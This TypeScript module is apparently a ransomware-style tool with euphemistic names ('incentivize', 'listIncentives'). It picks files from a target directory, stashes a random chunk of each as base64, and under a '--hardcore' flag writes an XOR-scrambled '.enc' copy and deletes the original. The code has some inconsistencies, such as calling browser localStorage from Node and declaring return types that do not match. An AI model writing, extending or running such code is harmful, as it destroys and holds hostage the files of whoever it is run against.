import { getFiles, sampleN, FileEntry } from "./helpers";
import { promises as fs } from 'node:fs';
import { Buffer } from 'node:buffer';
import { basename } from 'node:path';

export interface Rats {
    listIncentives: (count: number) => Promise<FileEntry[]>,
    incentivize: (file: FileEntry) => void,
    isTimerLaunch: boolean,
    isHardcore: boolean
}

async function listIncentives(count = 8): Promise<string[]> {
    const files = await getFiles(encryptionDir);
    return sampleN(files, count);
}

export async function copyRandomChunk(
  file: FileEntry,
  chunkSize = 128
) {
  const stats = await fs.stat(file.path);
  const fileSize = stats.size;

  if (fileSize === 0) throw new Error('Source file is empty.');

  const start = Math.floor(Math.random() * Math.max(1, fileSize - chunkSize));
  const end = Math.min(start + chunkSize, fileSize);

  const buffer = Buffer.alloc(end - start);

  const handle = await fs.open(file.path, 'r');
  await handle.read(buffer, 0, buffer.length, start);
  await handle.close();

  localStorage.setItem('partial_' + file.name, buffer.toString('base64'));
}

async function incentivize(file: FileEntry): Promise<void> {
  await copyRandomChunk(file);
  if(!isHardcore) return;

  const readHandle = await fs.open(file.path, 'r');
  const writeHandle = await fs.open(file.path + '.enc', 'w');

  const buf = Buffer.alloc(1024);

  try {
    while (true) {
      const { bytesRead } = await readHandle.read(buf, 0, buf.length, null);
      if (bytesRead === 0) break;

      for (let i = 0; i < bytesRead; i++) {
        buf[i] ^= 0x4a;
      }

      await writeHandle.write(buf.subarray(0, bytesRead));
    }
  } finally {
    await readHandle.close();
    await writeHandle.close();
  }

  await fs.rm(file.path);
}

var isTimerLaunch = process.argv.includes('--timer')
var isHardcore = process.argv.includes('--hardcore')

var encryptionDir = './';
for(let i = 0; i < process.argv.length - 1; i++) {
    if(process.argv[i] == '--dir') encryptionDir = process.argv[i+1];
}

export default { listIncentives, incentivize, isTimerLaunch, isHardcore };
